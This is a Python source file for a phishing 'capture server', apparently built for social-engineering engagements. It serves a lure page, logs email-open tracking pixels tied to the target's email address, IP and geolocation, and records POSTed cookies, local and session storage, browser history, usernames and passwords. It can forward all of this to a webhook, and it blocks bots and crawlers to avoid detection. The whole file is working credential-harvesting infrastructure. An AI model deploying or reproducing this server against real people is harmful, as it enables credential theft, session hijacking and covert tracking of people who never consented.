#!/usr/bin/env python3

import http.server
import socketserver
import json
import ssl
import os
import signal
import requests
import logging
from logging.handlers import RotatingFileHandler
from datetime import datetime, timedelta
from urllib.parse import urlparse, parse_qs
import sys
import time
import threading
import uuid
import re
import base64
import hashlib
import ipaddress

# Global settings
DEBUG = False

# Load JSON configuration
def load_config(file_path='config.json'):
    try:
        with open(file_path, 'r') as file:
            return json.load(file)
    except FileNotFoundError:
        print(f"Configuration file '{file_path}' not found.")
        create_default_config(file_path)
        with open(file_path, 'r') as file:
            return json.load(file)
    except json.JSONDecodeError as e:
        print(f"Error parsing the configuration file: {e}")
        sys.exit(1)

def create_default_config(file_path):
    """Create a default configuration file if it doesn't exist"""
    default_config = {
        "engagement": {
            "name": "default-engagement"
        },
        "server": {
            "port": 443,
            "working_dir": os.path.expanduser("~/trackers/default"),
            "log_dir": os.path.expanduser("~/trackers/default/logs"),
            "domain": "localhost",
            "email": "admin@example.com",
            "ssl_cert": {
                "cert_dir": "/etc/letsencrypt/live/",
                "cert_file": "fullchain.pem",
                "key_file": "privkey.pem"
            }
        },
        "ipinfo": {
            "token": ""
        },
        "cleanup": {
            "retention_days": 7
        },
        "paths": {
            "project_dir_base": os.path.expanduser("~/trackers"),
            "script_dir": "Tools/",
            "index_file": "index.html",
            "requirements_file": "requirements.txt",
            "capture_server_script": "capture-server.py",
            "log_cleanup_script": "log_cleanup.py",
            "specific_logs": [
                "server.log",
                "email_open_log.txt"
            ]
        },
        "tracking": {
            "email_pixel": True,
            "form_capture": True,
            "browser_data": True,
            "detailed_logging": True,
            "enable_webhooks": False,
            "webhook_url": ""
        },
        "security": {
            "restrict_ips": False,
            "allowed_ips": ["127.0.0.1"],
            "block_bots": True,
            "block_cloud_providers": False,
            "path_restrictions": ["/logs/", "/certs/", "/config.json"]
        }
    }
    
    os.makedirs(os.path.dirname(file_path), exist_ok=True)
    with open(file_path, 'w') as file:
        json.dump(default_config, file, indent=2)
    print(f"Created default configuration file at {file_path}")

# Configuration Validation
def validate_config(config):
    required_fields = [
        'engagement.name',
        'server.port',
        'server.working_dir',
        'server.log_dir',
        'server.domain',
        'server.email',
        'server.ssl_cert.cert_dir',
        'server.ssl_cert.cert_file',
        'server.ssl_cert.key_file',
        'ipinfo.token',
        'cleanup.retention_days',
        'paths.project_dir_base',
        'paths.script_dir',
        'paths.index_file',
        'paths.requirements_file',
        'paths.capture_server_script',
        'paths.log_cleanup_script',
        'paths.specific_logs'
    ]

    for field in required_fields:
        keys = field.split('.')
        value = config
        for key in keys:
            if key in value:
                value = value[key]
            else:
                print(f"Configuration warning: Missing '{field}', using default")
                # Use defaults instead of exiting
                return False
    
    return True

# Create a class to manage visitor sessions
class VisitorSession:
    sessions = {}
    
    @classmethod
    def create_or_get(cls, ip, user_agent):
        """Create a new session or get an existing one"""
        session_id = cls._generate_session_id(ip, user_agent)
        
        if session_id not in cls.sessions:
            cls.sessions[session_id] = {
                'ip': ip,
                'user_agent': user_agent,
                'first_seen': datetime.now(),
                'last_seen': datetime.now(),
                'page_views': 0,
                'form_submissions': 0,
                'browser_data': {},
                'history': []
            }
        else:
            cls.sessions[session_id]['last_seen'] = datetime.now()
            
        return session_id, cls.sessions[session_id]
        
    @classmethod
    def update_session(cls, session_id, activity_type, data=None):
        """Update a session with new activity"""
        if session_id not in cls.sessions:
            return False
            
        session = cls.sessions[session_id]
        session['last_seen'] = datetime.now()
        
        if activity_type == 'page_view':
            session['page_views'] += 1
        elif activity_type == 'form_submission':
            session['form_submissions'] += 1
            
        # Add to history
        history_entry = {
            'timestamp': datetime.now().isoformat(),
            'type': activity_type
        }
        
        if data:
            history_entry['data'] = data
            
        session['history'].append(history_entry)
        return True
        
    @classmethod
    def _generate_session_id(cls, ip, user_agent):
        """Generate a unique session ID based on IP and user agent"""
        combined = f"{ip}|{user_agent}|{datetime.now().date().isoformat()}"
        return hashlib.md5(combined.encode()).hexdigest()
        
    @classmethod
    def clean_old_sessions(cls, max_age_hours=24):
        """Remove sessions older than the specified age"""
        now = datetime.now()
        sessions_to_remove = []
        
        for session_id, session in cls.sessions.items():
            last_seen = session['last_seen']
            age = now - last_seen
            
            if age > timedelta(hours=max_age_hours):
                sessions_to_remove.append(session_id)
                
        for session_id in sessions_to_remove:
            del cls.sessions[session_id]
            
        return len(sessions_to_remove)

# Load configuration
config = load_config()
valid_config = validate_config(config)

# Use variables from config
ENGAGEMENT_NAME = config['engagement']['name']
PORT = config['server']['port']
LOG_DIR = os.path.expanduser(config['server']['log_dir'])
WORKING_DIR = os.path.expanduser(config['server']['working_dir'])
DOMAIN = config['server']['domain']
EMAIL = config['server']['email']
SSL_CERT_DIR = config['server']['ssl_cert']['cert_dir']
SSL_CERT_FILE = config['server']['ssl_cert']['cert_file']
SSL_KEY_FILE = config['server']['ssl_cert']['key_file']
IPINFO_TOKEN = config['ipinfo']['token']
RETENTION_DAYS = config['cleanup']['retention_days']
PROJECT_DIR_BASE = os.path.expanduser(config['paths']['project_dir_base'])
SCRIPT_DIR_RELATIVE = config['paths']['script_dir']
PROJECT_DIR = os.path.join(PROJECT_DIR_BASE, ENGAGEMENT_NAME)
SCRIPT_DIR = os.path.join(PROJECT_DIR, SCRIPT_DIR_RELATIVE)
INDEX_FILE = config['paths']['index_file']
REQUIREMENTS_FILE = config['paths']['requirements_file']
CAPTURE_SERVER_SCRIPT = config['paths']['capture_server_script']
LOG_CLEANUP_SCRIPT = config['paths']['log_cleanup_script']
SPECIFIC_LOGS = config['paths']['specific_logs']

# Security settings
SECURITY_CONFIG = config.get('security', {})
RESTRICT_IPS = SECURITY_CONFIG.get('restrict_ips', False)
ALLOWED_IPS = SECURITY_CONFIG.get('allowed_ips', ['127.0.0.1'])
BLOCK_BOTS = SECURITY_CONFIG.get('block_bots', True)
BLOCK_CLOUD_PROVIDERS = SECURITY_CONFIG.get('block_cloud_providers', False)
PATH_RESTRICTIONS = SECURITY_CONFIG.get('path_restrictions', ['/logs/', '/certs/', '/config.json'])

# Tracking settings
TRACKING_CONFIG = config.get('tracking', {})
ENABLE_EMAIL_PIXEL = TRACKING_CONFIG.get('email_pixel', True)
ENABLE_FORM_CAPTURE = TRACKING_CONFIG.get('form_capture', True)
ENABLE_BROWSER_DATA = TRACKING_CONFIG.get('browser_data', True)
DETAILED_LOGGING = TRACKING_CONFIG.get('detailed_logging', True)
ENABLE_WEBHOOKS = TRACKING_CONFIG.get('enable_webhooks', False)
WEBHOOK_URL = TRACKING_CONFIG.get('webhook_url', '')

# Paths constructed from config
LOG_FILE = os.path.join(LOG_DIR, 'server.log')
EMAIL_OPEN_LOG_FILE = os.path.join(LOG_DIR, 'email_open_log.txt')
FORM_SUBMISSIONS_LOG_FILE = os.path.join(LOG_DIR, 'form_submissions.txt')
ACCESS_LOG_FILE = os.path.join(LOG_DIR, 'access.log')
VISITOR_SESSIONS_FILE = os.path.join(LOG_DIR, 'visitor_sessions.json')

# Ensure the log directory exists
os.makedirs(LOG_DIR, exist_ok=True)

# Configure Logging
logger = logging.getLogger('CaptureServer')
logger.setLevel(logging.DEBUG if DEBUG else logging.INFO)

# Create a rotating file handler
handler = RotatingFileHandler(LOG_FILE, maxBytes=5*1024*1024, backupCount=5)  # 5MB per file, 5 backups
formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
handler.setFormatter(formatter)

logger.addHandler(handler)

# Log to console as well
console_handler = logging.StreamHandler()
console_handler.setFormatter(formatter)
logger.addHandler(console_handler)

# Change working directory to where index.html is located
os.chdir(PROJECT_DIR)

# Bot detection patterns
BOT_PATTERNS = [
    r'bot', r'crawler', r'spider', r'slurp', r'baiduspider', r'yandex', 
    r'googlebot', r'bingbot', r'semrushbot', r'ahrefsbot', r'scanbot'
]

class Handler(http.server.SimpleHTTPRequestHandler):
    def is_bot(self, user_agent):
        """Check if the user agent indicates a bot"""
        if not user_agent:
            return False
            
        user_agent_lower = user_agent.lower()
        for pattern in BOT_PATTERNS:
            if re.search(pattern, user_agent_lower):
                return True
        return False
    
    def is_allowed_ip(self, ip):
        """Check if the IP is allowed when IP restriction is enabled"""
        if not RESTRICT_IPS:
            return True
            
        return ip in ALLOWED_IPS
    
    def log_visitor(self, additional_data=None, path=None):
        try:
            visitor_ip = self.client_address[0]
            user_agent = self.headers.get('User-Agent', 'Unknown')
            referrer = self.headers.get('Referer', 'Direct')
            requested_path = path or self.path

            # Create or get session
            session_id, session = VisitorSession.create_or_get(visitor_ip, user_agent)
            
            # Update session based on activity
            if additional_data and 'form_data' in additional_data:
                VisitorSession.update_session(session_id, 'form_submission', additional_data.get('form_data'))
            else:
                VisitorSession.update_session(session_id, 'page_view', {'path': requested_path})
                
            # Get location data if enabled
            location = "Location lookup disabled"
            if DETAILED_LOGGING:
                location = self.get_location(visitor_ip)
                
            # Log the visitor
            log_entry = {
                "timestamp": datetime.now().isoformat(),
                "ip": visitor_ip,
                "user_agent": user_agent,
                "referrer": referrer,
                "path": requested_path,
                "location": location,
                "session_id": session_id
            }
            
            if additional_data:
                log_entry.update(additional_data)
                
            # Write to access log
            with open(ACCESS_LOG_FILE, 'a') as log:
                log.write(json.dumps(log_entry) + "\n")
                
            # Send webhook if enabled
            if ENABLE_WEBHOOKS and WEBHOOK_URL:
                self.send_webhook(log_entry)
                
            logger.info(f"Logged visitor: {visitor_ip} - User-Agent: {user_agent} - Path: {requested_path}")
            
            # Save sessions periodically
            self.save_sessions()
                
        except Exception as e:
            logger.error(f"Error logging visitor: {e}")
    
    def save_sessions(self):
        """Save visitor sessions to a file periodically"""
        try:
            # Only save every 10 requests to reduce disk I/O
            if hasattr(self.__class__, 'request_count'):
                self.__class__.request_count += 1
            else:
                self.__class__.request_count = 1
                
            if self.__class__.request_count % 10 == 0:
                with open(VISITOR_SESSIONS_FILE, 'w') as f:
                    # Convert datetime objects to strings
                    sessions_copy = {}
                    for session_id, session in VisitorSession.sessions.items():
                        session_copy = session.copy()
                        session_copy['first_seen'] = session['first_seen'].isoformat()
                        session_copy['last_seen'] = session['last_seen'].isoformat()
                        sessions_copy[session_id] = session_copy
                        
                    json.dump(sessions_copy, f, indent=2)
        except Exception as e:
            logger.error(f"Error saving sessions: {e}")
    
    def send_webhook(self, data):
        """Send data to a webhook endpoint"""
        try:
            response = requests.post(
                WEBHOOK_URL,
                json=data,
                headers={"Content-Type": "application/json"},
                timeout=5
            )
            
            if response.status_code != 200:
                logger.error(f"Webhook error: {response.status_code} - {response.text}")
                
        except Exception as e:
            logger.error(f"Error sending webhook: {e}")
    
    def get_location(self, ip):
        try:
            # Skip for localhost and private IPs
            if ip == "127.0.0.1" or ip == "::1" or self.is_private_ip(ip):
                return "Local/Private IP"
                
            if not IPINFO_TOKEN:
                return "No IPinfo token configured"
                
            response = requests.get(f"https://ipinfo.io/{ip}/json?token={IPINFO_TOKEN}", timeout=5)
            data = response.json()
            
            if "bogon" in data and data["bogon"]:
                return "Private/Reserved IP"
                
            location = f"{data.get('city', 'Unknown')}, {data.get('region', 'Unknown')}, {data.get('country', 'Unknown')}"
            
            # Add coordinates if available
            if 'loc' in data:
                location += f" ({data['loc']})"
                
            # Add organization if available
            if 'org' in data:
                location += f" - {data['org']}"
                
            return location
        except Exception as e:
            logger.error(f"Location lookup failed for IP {ip}: {e}")
            return "Location lookup failed"
    
    def is_private_ip(self, ip):
        """Check if an IP address is private"""
        try:
            return ipaddress.ip_address(ip).is_private
        except ValueError:
            return False

    def validate_path(self, path):
        """Prevent access to sensitive files and directories"""
        normalized_path = os.path.normpath(path)
        
        # Check against restricted paths
        for restricted_path in PATH_RESTRICTIONS:
            if restricted_path in normalized_path:
                logger.warning(f"Access to {path} is forbidden (restricted path)")
                return False
                
        # Prevent directory traversal
        if '..' in normalized_path:
            logger.warning(f"Access to {path} is forbidden (directory traversal)")
            return False
            
        # Prevent access to sensitive files like configuration
        if normalized_path.endswith('.json') and 'config' in normalized_path:
            logger.warning(f"Access to {path} is forbidden (config file)")
            return False
            
        # Prevent access to log directory
        if '/logs/' in normalized_path or normalized_path.startswith('/logs'):
            logger.warning(f"Access to {path} is forbidden (logs directory)")
            return False
            
        # Prevent access to certificate directory  
        if '/certs/' in normalized_path or normalized_path.startswith('/certs'):
            logger.warning(f"Access to {path} is forbidden (certs directory)")
            return False
            
        return True

    def do_GET(self):
        visitor_ip = self.client_address[0]
        user_agent = self.headers.get('User-Agent', '')
        
        # Check IP restrictions
        if not self.is_allowed_ip(visitor_ip):
            self.send_error(403, "Forbidden: IP not allowed")
            logger.warning(f"Blocked request from restricted IP: {visitor_ip}")
            return
            
        # Check bot restrictions
        if BLOCK_BOTS and self.is_bot(user_agent):
            self.send_error(403, "Forbidden: Bot detected")
            logger.warning(f"Blocked bot request from: {visitor_ip} - {user_agent}")
            return
            
        logger.info(f"Handling GET request for {self.path}")
        
        # Email tracking pixel
        if self.path.startswith('/track-open') and ENABLE_EMAIL_PIXEL:
            self.log_email_open()
            self.send_response(200)
            self.send_header('Content-type', 'image/png')
            self.send_header('Cache-Control', 'no-cache, no-store, must-revalidate')
            self.send_header('Pragma', 'no-cache')
            self.send_header('Expires', '0')
            self.end_headers()
            
            # 1x1 transparent PNG
            self.wfile.write(
                b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01'
                b'\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89'
                b'\x00\x00\x00\nIDATx\xdacd\xf8\xff\xff?\x00\x05\xfe\x02'
                b'\xfeA\x9c\xc0\x00\x00\x00\x00IEND\xaeB`\x82')
            return

        # Path validation
        if not self.validate_path(self.path):
            self.send_response(403)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(b'Access forbidden')
            return

        # Serve index.html for root path and other specific paths
        if self.path in ['/', '/index.html', '/n0m4d1k1337', '/n0m4d1k']:
            self.path = os.path.join(WORKING_DIR, INDEX_FILE)
            
        # Log the visitor
        self.log_visitor(path=self.path)
        
        # Call the parent handler to serve the file
        return http.server.SimpleHTTPRequestHandler.do_GET(self)

    def log_email_open(self):
        try:
            visitor_ip = self.client_address[0]
            user_agent = self.headers.get('User-Agent', 'Unknown')
            query_components = parse_qs(urlparse(self.path).query)
            email = query_components.get('email', ['Unknown'])[0]
            
            # Get additional metadata if available
            campaign = query_components.get('campaign', ['Unknown'])[0]
            template = query_components.get('template', ['Unknown'])[0]
            
            # Get location data
            location = self.get_location(visitor_ip)
            
            # Format log entry
            timestamp = datetime.now().isoformat()
            log_entry = {
                "timestamp": timestamp,
                "type": "email_open",
                "email": email,
                "ip": visitor_ip,
                "user_agent": user_agent,
                "location": location,
                "campaign": campaign,
                "template": template
            }
            
            # Write to email open log file
            with open(EMAIL_OPEN_LOG_FILE, 'a') as email_log:
                email_log.write(json.dumps(log_entry) + "\n")
                
            # Send webhook if enabled
            if ENABLE_WEBHOOKS and WEBHOOK_URL:
                self.send_webhook(log_entry)
                
            logger.info(f"Logged email open: {email} - IP: {visitor_ip}")
            
        except Exception as e:
            logger.error(f"Error logging email open: {e}")

    def do_POST(self):
        logger.info(f"Handling POST request for {self.path}")
        
        # Check IP restrictions
        if not self.is_allowed_ip(self.client_address[0]):
            self.send_response(403)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"error": "IP not allowed"}).encode())
            return
            
        # Check bot restrictions
        if BLOCK_BOTS and self.is_bot(self.headers.get('User-Agent', '')):
            self.send_response(403)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"error": "Bot access not allowed"}).encode())
            return
        
        # Path validation
        if not self.validate_path(self.path):
            self.send_response(403)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"error": "Path access forbidden"}).encode())
            return

        try:
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            
            # Attempt to parse as JSON
            try:
                data = json.loads(post_data)
            except json.JSONDecodeError:
                # If not JSON, try to parse as form data
                data = parse_qs(post_data.decode())
                # Convert lists to single values for easier handling
                for key in data:
                    if isinstance(data[key], list) and len(data[key]) == 1:
                        data[key] = data[key][0]

            if self.path == '/log':
                self.handle_log_data(data)
            elif self.path == '/form':
                self.handle_form_submission(data)
            else:
                self.send_response(404)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({"error": "Endpoint not found"}).encode())
                
        except Exception as e:
            logger.error(f"Error in do_POST: {e}")
            self.send_response(500)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"error": str(e)}).encode())

    def handle_log_data(self, data):
        """Handle general logging data submitted to /log endpoint"""
        logger.debug(f"Logging data: {data}")
        
        # Categorize the data
        log_entry = {
            'form_data': {},
            'cookies': data.get('cookies', ''),
            'client_data': {
                'history': data.get('history', ''),
                'localStorageData': data.get('localStorageData', ''),
                'sessionStorageData': data.get('sessionStorageData', ''),
                'plugins': data.get('plugins', ''),
                'userAgent': data.get('userAgent', ''),
                'screenResolution': data.get('screenResolution', ''),
                'timeZone': data.get('timeZone', ''),
                'language': data.get('language', ''),
                'referrer': data.get('referrer', '')
            }
        }
        
        # If this is form data, add it to the form_data section
        if any(k for k in data.keys() if k.startswith('login_') or k in ['username', 'password', 'email']):
            for key, value in data.items():
                if key != 'cookies' and key not in log_entry['client_data']:
                    log_entry['form_data'][key] = value
        
        # Log the visitor with this enhanced data
        self.log_visitor(additional_data=log_entry)
        
        # Respond with success
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(json.dumps({"status": "success"}).encode())

    def handle_form_submission(self, data):
        """Handle form submission data specifically"""
        logger.info(f"Form submission received")
        
        # Record the timestamp
        timestamp = datetime.now().isoformat()
        
        # Create a form submission log entry
        form_data = {
            "timestamp": timestamp,
            "ip": self.client_address[0],
            "user_agent": self.headers.get('User-Agent', 'Unknown'),
            "data": data
        }
        
        # Write to form submissions log
        with open(FORM_SUBMISSIONS_LOG_FILE, 'a') as form_log:
            form_log.write(json.dumps(form_data) + "\n")
            
        # Also log as visitor event with additional data
        log_entry = {
            'form_data': data,
            'timestamp': timestamp
        }
        self.log_visitor(additional_data=log_entry)
        
        # Send webhook if enabled
        if ENABLE_WEBHOOKS and WEBHOOK_URL:
            self.send_webhook(form_data)
            
        # Respond with success
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(json.dumps({"status": "success"}).encode())

    def log_message(self, format, *args):
        """Override to control built-in logging"""
        if DEBUG:
            # Only log debug messages in debug mode
            sys.stderr.write("%s - - [%s] %s\n" %
                         (self.address_string(),
                          self.log_date_time_string(),
                          format%args))

# Clean up old sessions periodically
def session_cleanup_task():
    """Background task to clean up old sessions"""
    while True:
        try:
            removed_count = VisitorSession.clean_old_sessions(max_age_hours=24)
            if removed_count > 0:
                logger.info(f"Cleaned up {removed_count} old visitor sessions")
        except Exception as e:
            logger.error(f"Error in session cleanup task: {e}")
            
        # Sleep for 1 hour
        time.sleep(3600)

def create_ssl_context():
    """Create an SSL context for the server"""
    try:
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        domain_dir = os.path.join(SSL_CERT_DIR, DOMAIN)
        cert_path = os.path.join(domain_dir, SSL_CERT_FILE)
        key_path = os.path.join(domain_dir, SSL_KEY_FILE)
        
        # Check if cert files exist
        if os.path.exists(cert_path) and os.path.exists(key_path):
            context.load_cert_chain(certfile=cert_path, keyfile=key_path)
            return context
        else:
            logger.warning(f"SSL certificate files not found at {cert_path} and {key_path}")
            logger.warning("Starting server without SSL. Use Let's Encrypt to obtain certificates.")
            return None
    except Exception as e:
        logger.error(f"Error creating SSL context: {e}")
        return None

def log_server_info():
    """Log server startup information"""
    logger.info("=" * 50)
    logger.info(f"Starting Tracker Server for engagement: {ENGAGEMENT_NAME}")
    logger.info(f"Domain: {DOMAIN}")
    logger.info(f"Port: {PORT}")
    logger.info(f"Working directory: {WORKING_DIR}")
    logger.info(f"Log directory: {LOG_DIR}")
    logger.info("-" * 50)
    logger.info("Security settings:")
    logger.info(f"  IP restrictions: {'Enabled' if RESTRICT_IPS else 'Disabled'}")
    logger.info(f"  Block bots: {'Enabled' if BLOCK_BOTS else 'Disabled'}")
    logger.info(f"  Block cloud providers: {'Enabled' if BLOCK_CLOUD_PROVIDERS else 'Disabled'}")
    logger.info("-" * 50)
    logger.info("Tracking features:")
    logger.info(f"  Email pixel tracking: {'Enabled' if ENABLE_EMAIL_PIXEL else 'Disabled'}")
    logger.info(f"  Form data capture: {'Enabled' if ENABLE_FORM_CAPTURE else 'Disabled'}")
    logger.info(f"  Browser data collection: {'Enabled' if ENABLE_BROWSER_DATA else 'Disabled'}")
    logger.info(f"  Detailed logging: {'Enabled' if DETAILED_LOGGING else 'Disabled'}")
    logger.info(f"  Webhooks: {'Enabled' if ENABLE_WEBHOOKS else 'Disabled'}")
    logger.info("=" * 50)

def start_server():
    """Start the HTTP server"""
    log_server_info()
    
    # Start session cleanup thread
    cleanup_thread = threading.Thread(target=session_cleanup_task, daemon=True)
    cleanup_thread.start()
    
    # Create SSL context
    context = create_ssl_context()
    
    try:
        # Create the server
        server = socketserver.TCPServer(("", PORT), Handler)
        
        # Wrap socket with SSL if context is available
        if context:
            server.socket = context.wrap_socket(server.socket, server_side=True)
            logger.info(f"Server running with HTTPS on port {PORT}")
        else:
            logger.info(f"Server running with HTTP on port {PORT}")
        
        # Set up signal handler for graceful shutdown
        def signal_handler(sig, frame):
            logger.info("Stopping server...")
            server.shutdown()
            server.server_close()
            logger.info("Server stopped.")
            sys.exit(0)
            
        signal.signal(signal.SIGINT, signal_handler)
        signal.signal(signal.SIGTERM, signal_handler)
        
        # Start the server
        server.serve_forever()
        
    except Exception as e:
        logger.error(f"Server error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    # Parse command-line arguments
    import argparse
    parser = argparse.ArgumentParser(description="Capture Server for tracking")
    parser.add_argument("--config", help="Path to configuration file", default="config.json")
    parser.add_argument("--debug", action="store_true", help="Enable debug mode")
    args = parser.parse_args()
    
    # Set debug mode
    if args.debug:
        DEBUG = True
        logger.setLevel(logging.DEBUG)
        logger.debug("Debug mode enabled")
    
    # Start the server
    start_server()